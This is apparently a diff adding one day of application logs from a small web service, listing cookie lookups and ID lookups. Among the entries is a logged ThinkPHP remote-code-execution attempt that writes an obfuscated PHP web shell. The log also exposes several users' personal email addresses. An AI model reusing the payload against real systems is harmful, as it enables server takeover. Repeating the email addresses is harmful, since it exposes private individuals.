@@ -1,0 +1,61 @@
+2019-01-12 0:05:49 - INFO --> getUserByCookie: 
+2019-01-12 0:53:45 - INFO --> getUserByCookie: 
+2019-01-12 0:53:45 - INFO --> getZoomById: email=efrenalvara%40gmail.com&reportType=&description=&
+2019-01-12 1:32:09 - INFO --> getUserByCookie: 
+2019-01-12 1:32:09 - INFO --> getZoomById: email=banana0042%40gmail.com&reportType=&description=&
+2019-01-12 3:45:34 - INFO --> getUserByCookie: 
+2019-01-12 3:45:34 - INFO --> getZoomById: .well-known/acme-challenge/Oxbjr8c-0iFkcc_qaVaXxkoRNaPhtUk3CUxp09RYaJU
+2019-01-12 3:45:34 - INFO --> getUserByCookie: 
+2019-01-12 3:45:34 - INFO --> getZoomById: .well-known/acme-challenge/Pqedav6OOWYVr8LLIRmpbgTchikq0teOnvcgtcQ356o
+2019-01-12 3:45:34 - INFO --> getUserByCookie: 
+2019-01-12 3:45:34 - INFO --> getZoomById: .well-known/acme-challenge/k3GPoxZ-3OIuygrMmbUronydOApR4dQxfUvWPECaatc
+2019-01-12 3:45:34 - INFO --> getUserByCookie: 
+2019-01-12 3:45:34 - INFO --> getZoomById: .well-known/acme-challenge/ljyd7GP4OUuaSxjKhb96tGZdnR_9-_tsYBaCSdcVIW8
+2019-01-12 4:38:17 - INFO --> getUserByCookie: 
+2019-01-12 4:38:17 - INFO --> getZoomById: email=rochakevin33%40gmail.com&reportType=&description=&
+2019-01-12 5:10:27 - INFO --> getUserByCookie: 
+2019-01-12 5:10:27 - INFO --> getZoomById: email=rossiero%40aol.com&reportType=&description=&
+2019-01-12 7:00:19 - INFO --> getUserByCookie: 
+2019-01-12 7:00:19 - INFO --> getZoomById: email=efrenalvara%40gmail.com&reportType=&description=&
+2019-01-12 7:03:20 - INFO --> getUserByCookie: 
+2019-01-12 7:03:20 - INFO --> getZoomById: iSctp
+2019-01-12 7:03:20 - INFO --> incrementZoomById: iSctp
+2019-01-12 7:03:20 - INFO --> increment zoom: iSctp
+2019-01-12 7:10:47 - INFO --> getUserByCookie: 
+2019-01-12 7:18:00 - INFO --> getUserByCookie: 
+2019-01-12 7:18:00 - INFO --> getZoomById: iSctp
+2019-01-12 7:18:00 - INFO --> incrementZoomById: iSctp
+2019-01-12 7:18:00 - INFO --> increment zoom: iSctp
+2019-01-12 8:29:12 - INFO --> getUserByCookie: 
+2019-01-12 8:29:12 - INFO --> getZoomById: email=mattkotapka%40gmail.com&reportType=&description=&
+2019-01-12 10:08:41 - INFO --> getUserByCookie: 
+2019-01-12 11:29:16 - INFO --> getUserByCookie: 
+2019-01-12 11:29:16 - INFO --> getZoomById: email=aussieblue517%40aol.com&reportType=&description=&
+2019-01-12 12:34:15 - INFO --> getUserByCookie: 
+2019-01-12 12:34:15 - INFO --> getZoomById: email=banana0042%40gmail.com&reportType=&description=&
+2019-01-12 13:15:41 - INFO --> getUserByCookie: 
+2019-01-12 13:15:41 - INFO --> getZoomById: email=bethgord10%40gmail.com&reportType=&description=&
+2019-01-12 15:03:44 - INFO --> getUserByCookie: 
+2019-01-12 15:03:44 - INFO --> getZoomById: email=alejandroblanchard%40gmail.com&reportType=&description=&
+2019-01-12 15:32:40 - INFO --> getUserByCookie: 
+2019-01-12 15:32:40 - INFO --> getZoomById: s=/index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=zdgzjd.php&vars[1][]=%3C?php%20print(md5(222));$a=str_replace(%22vbnm%22,%22%22,%22asvbnmsert%22);@$a($_POST[qazw]);?%3E
+2019-01-12 19:05:37 - INFO --> getUserByCookie: 
+2019-01-12 19:05:37 - INFO --> getZoomById: iSctp
+2019-01-12 19:05:37 - INFO --> incrementZoomById: iSctp
+2019-01-12 19:05:37 - INFO --> increment zoom: iSctp
+2019-01-12 19:30:35 - INFO --> getUserByCookie: 
+2019-01-12 19:30:35 - INFO --> getZoomById: email=lynnerudstrom%40gmail.com&reportType=&description=&
+2019-01-12 21:05:34 - INFO --> getUserByCookie: 
+2019-01-12 21:05:34 - INFO --> getZoomById: email=nissan04.ff%40gmail.com&reportType=&description=&
+2019-01-12 21:09:02 - INFO --> getUserByCookie: 
+2019-01-12 21:09:02 - INFO --> getZoomById: email=michaeldespones%40yahoo.com&reportType=&description=&
+2019-01-12 21:23:37 - INFO --> getUserByCookie: 
+2019-01-12 21:23:37 - INFO --> getZoomById: email=elfrenalvara%40gmail.com&reportType=&description=&
+2019-01-12 22:00:44 - INFO --> getUserByCookie: 
+2019-01-12 22:00:44 - INFO --> getZoomById: result.php
+2019-01-12 22:00:53 - INFO --> getUserByCookie: 
+2019-01-12 22:00:53 - INFO --> getZoomById: result.php
+2019-01-12 22:00:59 - INFO --> getUserByCookie: 
+2019-01-12 22:00:59 - INFO --> getZoomById: public/index.php
+2019-01-12 22:01:05 - INFO --> getUserByCookie: 
+2019-01-12 22:01:05 - INFO --> getZoomById: public/result.php
